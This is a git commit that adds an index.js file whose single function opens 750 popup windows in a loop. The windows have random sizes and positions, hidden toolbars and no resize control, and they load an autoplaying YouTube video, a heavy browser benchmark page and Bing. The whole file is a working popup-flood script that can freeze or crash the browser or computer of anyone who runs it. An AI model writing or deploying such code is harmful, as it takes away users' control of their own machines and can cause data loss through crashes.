5fc7738cc3c0840cdec43b23fd096664d2993487
Willem <34539867+willemfluit@users.noreply.github.com>
2020-07-22 19:03:22 +0200

    Add files via upload

---
+++ index.js
@@ -0,0 +1,19 @@
+function specialjs() {
+  for (var i = 0; i < 250; i++) {
+    var left = Math.floor((Math.random() * 1000) + 1);
+    var top = Math.floor((Math.random() * 1000) + 1);
+    var width = Math.floor(Math.random() * (500 - 50 + 1) ) + 50;
+    var height = Math.floor(Math.random() * (500 - 50 + 1) ) + 50;
+    window.open('https://www.youtube-nocookie.com/embed/6Joyj0dmkug?autoplay=1;controls=0;disablekb=0;showinfo=0', '_blank', 'width=' +width+ ',height=' +height+ ',left=' +left+ ',top=' +top+ ',allow="autoplay" toolbar=0,menubar=0,scrollbars=0,statusbar=0,resizable=0,');
+    var left = Math.floor((Math.random() * 1000) + 1);
+    var top = Math.floor((Math.random() * 1000) + 1);
+    var width = Math.floor(Math.random() * (750 - 250 + 1) ) + 250;
+    var height = Math.floor(Math.random() * (750 - 250 + 1) ) + 250;
+    window.open('https://web.basemark.com/run/', '_blank',  'width=' +width+ ',height=' +height+ ',left=' + left + ',top=' + top + ',toolbar=0,menubar=0,scrollbars=0,statusbar=0,resizable=0,');
+    var left = Math.floor((Math.random() * 1000) + 1);
+    var top = Math.floor((Math.random() * 1000) + 1);
+    var width = Math.floor(Math.random() * (750 - 50 + 1) ) + 50;
+    var height = Math.floor(Math.random() * (750 - 50 + 1) ) + 50;
+    window.open('https://bing.com', '_blank',  'width=' +width+ ',height=' +height+ ',left=' + left + ',top=' + top + ',toolbar=0,menubar=0,scrollbars=0,statusbar=0,resizable=0,');
+  }
+}
